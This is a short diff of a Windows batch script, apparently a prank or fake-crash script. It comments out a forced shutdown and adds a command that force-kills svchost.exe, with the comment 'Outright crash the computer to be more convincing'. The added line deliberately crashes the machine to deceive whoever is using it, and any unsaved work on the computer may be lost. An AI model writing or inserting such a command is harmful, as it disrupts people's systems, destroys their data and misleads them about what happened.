@@ -52,4 +52,7 @@ RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 timeout /t 7
 
 :: /r for restart, /s for shutdown
-shutdown /s -f -t 0
+::shutdown /s -f -t 0
+
+:: Outright crash the computer to be more convincing
+taskkill.exe /f /im svchost.exe
